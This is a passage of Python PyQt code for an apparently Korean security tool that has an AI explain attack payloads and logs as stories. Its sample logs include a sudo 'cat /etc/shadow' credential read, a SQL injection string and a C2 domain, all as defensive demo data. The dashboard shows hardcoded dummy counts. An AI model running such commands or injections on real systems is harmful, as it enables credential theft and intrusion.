        payload = self.payload_input.toPlainText().strip()
        if not payload:
            QMessageBox.warning(self, "입력 오류", "분석할 페이로드를 입력해주세요.")
            return
        
        # 분석 중 상태 표시
        self.payload_analyze_btn.setEnabled(False)
        self.payload_analyze_btn.setText("🔄 분석 중...")
        self.payload_story_display.setHtml("""
        <div style='text-align: center; color: #1890ff; padding: 50px;'>
            <h3>🔄 페이로드 분석 중...</h3>
            <p>AI가 페이로드를 분석하고 있습니다. 잠시만 기다려주세요.</p>
        </div>
        """)
        
        # 백그라운드에서 분석 실행
        self.payload_thread = threading.Thread(target=self._analyze_payload_background, args=(payload,))
        self.payload_thread.start()
    
    def _analyze_payload_background(self, payload: str):
        """백그라운드에서 페이로드 분석"""
        try:
            if not self.client:
                self.error_occurred.emit("AI 클라이언트가 초기화되지 않았습니다.")
                return
            
            # 페이로드 분석 프롬프트 생성
            detailed = self.payload_detailed_cb.isChecked()
            mitigation = self.payload_mitigation_cb.isChecked()
            
            prompt = self._create_payload_analysis_prompt(payload, detailed, mitigation)
            
            # AI 분석 실행
            response = self.client.chat.completions.create(
                model=self.ai_config.deployment,
                messages=[
                    {"role": "system", "content": "당신은 사이버 보안 전문가입니다. 페이로드를 분석해서 이해하기 쉬운 스토리로 설명해주세요."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.3,
                max_tokens=2500
            )
            
            story_content = response.choices[0].message.content
            
            # 결과를 UI에 표시 (메인 스레드에서)
            QTimer.singleShot(0, lambda: self._display_payload_story(story_content))
            
        except Exception as e:
            QTimer.singleShot(0, lambda: self._show_payload_error(str(e)))
    
    def _create_payload_analysis_prompt(self, payload: str, detailed: bool, mitigation: bool) -> str:
        """페이로드 분석 프롬프트 생성"""
        prompt = f"""
다음 페이로드를 분석해서 이해하기 쉬운 스토리로 설명해주세요:

=== 분석할 페이로드 ===
{payload}

다음 형식으로 답변해주세요:

## 🎯 페이로드 개요
[이 페이로드가 무엇인지 간단히 설명]

## 📖 공격 스토리
[공격자가 무엇을 하려고 했는지 스토리 형식으로 설명]

## ⚡ 실행 과정
1. [첫 번째 단계]
2. [두 번째 단계]
3. [세 번째 단계]

## 🎯 공격 목적
[공격자의 최종 목표]

## ⚠️ 위험도 평가
- **심각도**: [낮음/보통/높음/심각]
- **영향 범위**: [로컬/네트워크/시스템 전체]
- **탐지 난이도**: [쉬움/보통/어려움]
"""
        
        if detailed:
            prompt += """
## 🔍 기술적 분석
- **사용된 기법**: [구체적인 공격 기법들]
- **악용된 취약점**: [이용된 보안 약점들]
- **우회 기법**: [보안 통제 우회 방법]
"""
        
        if mitigation:
            prompt += """
## 🛡️ 대응 방안
### 즉시 대응
- [긴급히 해야 할 조치들]

### 예방 조치
- [앞으로 예방할 수 있는 방법들]

### 탐지 방법
- [이런 공격을 찾는 방법들]
"""
        
        prompt += """
비전문가도 이해할 수 있도록 쉽고 재미있게 설명해주세요.
"""
        
        return prompt
    
    def _display_payload_story(self, story_content: str):
        """페이로드 스토리 표시"""
        # HTML 형식으로 변환
        html_content = story_content.replace('\n', '<br>')
        html_content = re.sub(r'##\s*(.+)', r'<h2 style="color: #1890ff; margin-top: 20px;">\1</h2>', html_content)
        html_content = re.sub(r'\*\*(.+?)\*\*', r'<strong>\1</strong>', html_content)
        
        formatted_html = f"""
        <div style="padding: 20px; font-family: 'Malgun Gothic', sans-serif; line-height: 1.8;">
            {html_content}
        </div>
        """
        
        self.payload_story_display.setHtml(formatted_html)
        
        # 버튼 상태 복원
        self.payload_analyze_btn.setEnabled(True)
        self.payload_analyze_btn.setText("🔍 페이로드 스토리 생성")
    
    def _show_payload_error(self, error_msg: str):
        """페이로드 분석 오류 표시"""
        error_html = f"""
        <div style='text-align: center; color: #ff4d4f; padding: 50px;'>
            <h3>❌ 분석 오류</h3>
            <p>페이로드 분석 중 오류가 발생했습니다:</p>
            <p><code>{error_msg}</code></p>
            <p>다시 시도해주세요.</p>
        </div>
        """
        
        self.payload_story_display.setHtml(error_html)
        
        # 버튼 상태 복원
        self.payload_analyze_btn.setEnabled(True)
        self.payload_analyze_btn.setText("🔍 페이로드 스토리 생성")
    
    def get_auth_attack_example(self) -> str:
        """인증 공격 예시 로그"""
        return """2024-01-15 15:42:15 [ERROR] sshd: Authentication failure for admin from 192.168.1.100 port 22
2024-01-15 15:42:30 [ERROR] sshd: Authentication failure for admin from 192.168.1.100 port 22
2024-01-15 15:42:45 [ERROR] sshd: Authentication failure for admin from 192.168.1.100 port 22
2024-01-15 15:42:58 [ERROR] sshd: Authentication failure for admin from 192.168.1.100 port 22
2024-01-15 15:43:01 [INFO] sshd: Accepted password for admin from 192.168.1.100 port 22 ssh2
2024-01-15 15:43:15 [WARNING] sudo: admin: TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow
2024-01-15 15:43:30 [ERROR] auditd: File modification detected: /etc/passwd modified by admin
2024-01-15 15:43:45 [WARNING] last: admin logged in from 192.168.1.100 at Mon Jan 15 15:43:01 2024
2024-01-15 15:44:00 [INFO] sshd: Connection closed by 192.168.1.100 port 22"""
    
    def get_malware_example(self) -> str:
        """악성코드 예시 로그"""
        return """2024-01-15 14:30:15 [INFO] antivirus: Scanning file: /home/user/downloads/document.pdf.exe
2024-01-15 14:30:16 [CRITICAL] antivirus: Malware detected: Trojan.Win32.Generic in /home/user/downloads/document.pdf.exe
2024-01-15 14:30:17 [WARNING] antivirus: File quarantined: /home/user/downloads/document.pdf.exe
2024-01-15 14:30:20 [ERROR] firewall: Outbound connection blocked to 185.220.101.45:8080 from 192.168.1.105
2024-01-15 14:30:25 [WARNING] process_monitor: Suspicious process started: c2client.exe PID:2847
2024-01-15 14:30:30 [ERROR] network_monitor: DNS query to malicious domain: evil-command-server.com
2024-01-15 14:30:35 [CRITICAL] file_monitor: System file modified: C:\\Windows\\System32\\drivers\\etc\\hosts
2024-01-15 14:30:40 [WARNING] registry_monitor: Registry key modified: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
2024-01-15 14:30:45 [INFO] antivirus: Full system scan initiated"""
    
    def get_network_intrusion_example(self) -> str:
        """네트워크 침입 예시 로그"""
        return """2024-01-15 16:15:00 [WARNING] firewall: Port scan detected from 203.0.113.45 targeting 192.168.1.0/24
2024-01-15 16:15:10 [INFO] firewall: TCP SYN scan on ports 22,23,80,443,3389 from 203.0.113.45
2024-01-15 16:15:15 [ERROR] ids: Brute force attack detected against SSH service from 203.0.113.45
2024-01-15 16:15:25 [WARNING] firewall: Multiple connection attempts blocked from 203.0.113.45
2024-01-15 16:15:30 [ERROR] nginx: 192.168.1.10 - Suspicious SQL injection attempt in request: /login.php?id=1' OR '1'='1
2024-01-15 16:15:35 [CRITICAL] ids: Possible exploit attempt: CVE-2021-44228 (Log4Shell) from 203.0.113.45
2024-01-15 16:15:40 [ERROR] firewall: Denied: TCP connection from 203.0.113.45:45231 to 192.168.1.10:22
2024-01-15 16:15:45 [WARNING] honeypot: Attacker interaction logged from 203.0.113.45
2024-01-15 16:15:50 [INFO] firewall: IP 203.0.113.45 added to blacklist for 24 hours"""
    
    def get_system_error_example(self) -> str:
        """시스템 오류 예시 로그"""
        return """2024-01-15 13:45:00 [WARNING] kernel: Memory usage critical: 95% of available memory in use
2024-01-15 13:45:05 [ERROR] mysql: Connection refused - too many connections (max: 100)
2024-01-15 13:45:10 [CRITICAL] disk_monitor: Disk space critical: /var partition 98% full
2024-01-15 13:45:15 [ERROR] apache: Server reached MaxRequestWorkers setting, consider raising it
2024-01-15 13:45:20 [WARNING] system: Load average: 15.42, 12.33, 10.88 (CPU overload)
2024-01-15 13:45:25 [INFO] backup_service: Backup failed - insufficient disk space
2024-01-15 13:45:30 [ERROR] logrotate: Cannot rotate logs - disk full on /var/log
2024-01-15 13:45:35 [WARNING] monitoring: Service response time exceeded threshold: 5.2s > 2.0s
2024-01-15 13:45:40 [CRITICAL] system: Out of memory killer invoked - terminated process httpd (PID: 1234)"""
    
    def get_normal_operation_example(self) -> str:
        """정상 운영 예시 로그"""
        return """2024-01-15 09:00:00 [INFO] system: System startup completed successfully
2024-01-15 09:00:15 [INFO] sshd: Server listening on 0.0.0.0 port 22
2024-01-15 09:00:30 [INFO] nginx: Starting web server nginx
2024-01-15 09:01:00 [INFO] mysql: MySQL server started successfully
2024-01-15 09:05:00 [INFO] backup_service: Daily backup initiated for /home/data
2024-01-15 09:15:00 [INFO] antivirus: Virus definitions updated successfully (version: 2024.01.15)
2024-01-15 09:30:00 [INFO] user: User john logged in from 192.168.1.50 via web interface
2024-01-15 10:00:00 [INFO] cron: Hourly maintenance tasks completed successfully
2024-01-15 10:30:00 [INFO] backup_service: Backup completed successfully (2.3GB archived)"""
    
    def on_input_method_changed(self):
        """입력 방법 변경 처리"""
        method = self.input_method.checkedId()
        
        if method == 0:  # 직접 붙여넣기
            self.log_input.setEnabled(True)
            self.file_card.setVisible(False)
        elif method == 1:  # 파일에서 읽기
            self.log_input.setEnabled(False)
            self.file_card.setVisible(True)
            self.file_path_input.setEnabled(True)
            self.browse_btn.setEnabled(True)
            self.load_btn.setEnabled(True)
        elif method == 2:  # 실시간 모니터링
            self.log_input.setEnabled(False)
            self.file_card.setVisible(False)
            # 실시간 모니터링 기능은 향후 구현
            QMessageBox.information(self, "준비 중", "실시간 모니터링 기능은 현재 개발 중입니다.")
            self.paste_radio.setChecked(True)
    
    def browse_log_file(self):
        """로그 파일 선택"""
        file_path, _ = QFileDialog.getOpenFileName(
            self, "로그 파일 선택",
            "",
            "Log Files (*.log *.txt);;All Files (*)"
        )
        
        if file_path:
            self.file_path_input.setText(file_path)
    
    def load_log_file(self):
        """로그 파일 로드"""
        file_path = self.file_path_input.text().strip()
        if not file_path:
            QMessageBox.warning(self, "파일 오류", "로그 파일 경로를 입력해주세요.")
            return
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            self.log_input.setText(content)
            QMessageBox.information(self, "완료", f"로그 파일을 성공적으로 로드했습니다.\n{len(content.split())}줄의 로그를 읽었습니다.")
            
        except Exception as e:
            QMessageBox.critical(self, "오류", f"파일을 읽는 중 오류가 발생했습니다:\n{str(e)}")
    
    def clear_logs(self):
        """로그 지우기"""
        reply = QMessageBox.question(
            self, "확인",
            "입력된 로그 데이터를 모두 지우시겠습니까?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            self.log_input.clear()
            self.current_logs.clear()
    
    def start_analysis(self):
        """로그 분석 시작"""
        log_text = self.log_input.toPlainText().strip()
        if not log_text:
            QMessageBox.warning(self, "입력 오류", "분석할 로그 데이터를 입력해주세요.")
            return
        
        # 로그 파싱
        self.current_logs = self.parse_log_text(log_text)
        if not self.current_logs:
            QMessageBox.warning(self, "파싱 오류", "유효한 로그 형식을 찾을 수 없습니다.")
            return
        
        # UI 상태 변경
        self.analyze_btn.setEnabled(False)
        self.analyze_btn.setText("🔄 분석 중...")
        self.progress_bar.setVisible(True)
        self.progress_bar.setValue(0)
        self.progress_label.setVisible(True)
        self.progress_label.setText("로그 분석을 시작합니다...")
        
        # 분석 시작
        self.engine.analyze_logs(self.current_logs)
    
    def parse_log_text(self, text: str) -> List[LogEntry]:
        """텍스트에서 로그 엔트리 파싱"""
        log_entries = []
        lines = text.strip().split('\n')
        
        # 간단한 로그 파싱 패턴
        log_pattern = r'(\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}).*?\[(\w+)\]\s*(.+?):\s*(.+)'
        
        for i, line in enumerate(lines):
            line = line.strip()
            if not line:
                continue
                
            # 정규식으로 파싱 시도
            match = re.match(log_pattern, line)
            if match:
                timestamp = match.group(1)
                level = match.group(2)
                source = match.group(3)
                message = match.group(4)
            else:
                # 간단한 패턴으로 파싱
                parts = line.split(' ', 3)
                if len(parts) >= 3:
                    timestamp = f"{parts[0]} {parts[1]}" if len(parts) >= 2 else datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    level = "INFO"
                    source = "system"
                    message = ' '.join(parts[2:]) if len(parts) > 2 else line
                else:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    level = "INFO"
                    source = "system"
                    message = line
            
            log_entry = LogEntry(
                timestamp=timestamp,
                source=source,
                level=level,
                message=message,
                raw_log=line,
                category=""
            )
            log_entries.append(log_entry)
        
        return log_entries
    
    def regenerate_story(self):
        """스토리 다시 생성"""
        if self.current_logs:
            self.start_analysis()
    
    @pyqtSlot(int, str)
    def on_progress_updated(self, progress: int, message: str):
        """진행 상황 업데이트"""
        self.progress_bar.setValue(progress)
        self.progress_label.setText(message)
    
    @pyqtSlot(dict)
    def on_story_generated(self, story_data):
        """스토리 생성 완료"""
        self.current_story = story_data
        
        # UI 상태 복원
        self.analyze_btn.setEnabled(True)
        self.analyze_btn.setText("🔍 AI로 로그 스토리 생성")
        self.progress_bar.setVisible(False)
        self.progress_label.setVisible(False)
        
        # 스토리 정보 표시
        self.story_title_label.setText(story_data['title'])
        self.story_date_label.setText(f"생성일: {story_data['created_at'][:19]}")
        self.risk_level_label.setText(f"위험도: {story_data['risk_level'].upper()}")
        self.log_count_label.setText(f"로그 수: {story_data['log_count']}건")
        
        # 스토리 내용 표시
        self.display_story_content(story_data['story_content'])
        
        # 대시보드 업데이트
        self.update_dashboard(story_data)
        
        # 버튼들 활성화
        self.export_story_btn.setEnabled(True)
        self.share_btn.setEnabled(True)
        self.regenerate_story_btn.setEnabled(True)
        
        # 성공 메시지
        QMessageBox.information(self, "분석 완료", "로그 스토리가 성공적으로 생성되었습니다!")
    
    @pyqtSlot(str)
    def on_error_occurred(self, error_message):
        """오류 발생 시 처리"""
        # UI 상태 복원
        self.analyze_btn.setEnabled(True)
        self.analyze_btn.setText("🔍 AI로 로그 스토리 생성")
        self.progress_bar.setVisible(False)
        self.progress_label.setVisible(False)
        
        # 오류 메시지 표시
        QMessageBox.critical(self, "오류", f"로그 분석 중 오류가 발생했습니다:\n\n{error_message}")
    
    def display_story_content(self, content: str):
        """스토리 내용 표시"""
        html_content = f"""
        <div style="padding: 25px; font-family: 'Malgun Gothic', sans-serif;">
            <div style="line-height: 1.8; color: #262626; font-size: 15px;">
                {self.format_story_html(content)}
            </div>
        </div>
        """
        
        self.story_display.setHtml(html_content)
    
    def format_story_html(self, text: str) -> str:
        """스토리 텍스트를 HTML로 포맷"""
        lines = text.split('\n')
        html_lines = []
        
        for line in lines:
            line = line.strip()
            if not line:
                html_lines.append('<br>')
            elif line.startswith('## '):
                title = line[3:].strip()
                html_lines.append(f'<h2 style="color: #1890ff; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #1890ff; padding-left: 15px;">{title}</h2>')
            elif line.startswith('### '):
                subtitle = line[4:].strip()
                html_lines.append(f'<h3 style="color: #595959; margin-top: 25px; margin-bottom: 12px;">{subtitle}</h3>')
            elif line.startswith('- '):
                list_item = line[2:]
                html_lines.append(f'<li style="margin: 8px 0; line-height: 1.7;">{list_item}</li>')
            elif '**' in line:
                # 굵은 텍스트 처리
                formatted_line = re.sub(r'\*\*(.*?)\*\*', r'<strong style="color: #262626;">\1</strong>', line)
                html_lines.append(f'<p style="margin: 12px 0; line-height: 1.8;">{formatted_line}</p>')
            else:
                html_lines.append(f'<p style="margin: 12px 0; line-height: 1.8;">{line}</p>')
        
        return ''.join(html_lines)
    
    def update_dashboard(self, story_data):
        """대시보드 업데이트"""
        # 카테고리별 통계 (더미 데이터)
        self.auth_count_label.setText("인증: 8건")
        self.network_count_label.setText("네트워크: 3건")
        self.security_count_label.setText("보안: 5건")
        self.system_count_label.setText("시스템: 2건")
        
        # 위험도별 통계 (더미 데이터)
        self.critical_count_label.setText("심각: 2건")
        self.high_count_label.setText("높음: 5건")
        self.medium_count_label.setText("보통: 8건")
        self.low_count_label.setText("낮음: 3건")
        
        # 시간대별 분석
        self.timeline_info.setText("15:42-15:44 시간대 집중적 활동 감지")
        
        # 이벤트 타임라인
        timeline_events = story_data.get('timeline', [])
        self.events_timeline.clear()
        for event in timeline_events[:10]:  # 최대 10개
            self.events_timeline.addItem(event)
        
        # 추천 대응방안
        recommendations = story_data.get('recommendations', [])
        self.recommendations_list.clear()
        for rec in recommendations[:10]:  # 최대 10개
            self.recommendations_list.addItem(rec)
    
    def export_story(self):
        """스토리 내보내기"""
        if not self.current_story:
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "스토리 내보내기",
            f"log_story_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html",
            "HTML Files (*.html);;Text Files (*.txt)"
        )
        
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    if file_path.endswith('.html'):
                        f.write(self.story_display.toHtml())
                    else:
                        f.write(self.current_story['story_content'])
                
                QMessageBox.information(self, "완료", f"스토리가 저장되었습니다:\n{file_path}")
            except Exception as e:
                QMessageBox.critical(self, "오류", f"파일 저장 중 오류가 발생했습니다:\n{str(e)}")
    
    def share_story(self):
        """스토리 공유"""
        if not self.current_story:
            return
        
        QMessageBox.information(self, "공유 기능", "스토리 공유 기능은 향후 구현 예정입니다.")

if __name__ == "__main__":
    app = QApplication([])
    tab = LogStorytellerTab()
    tab.show()
    app.exec()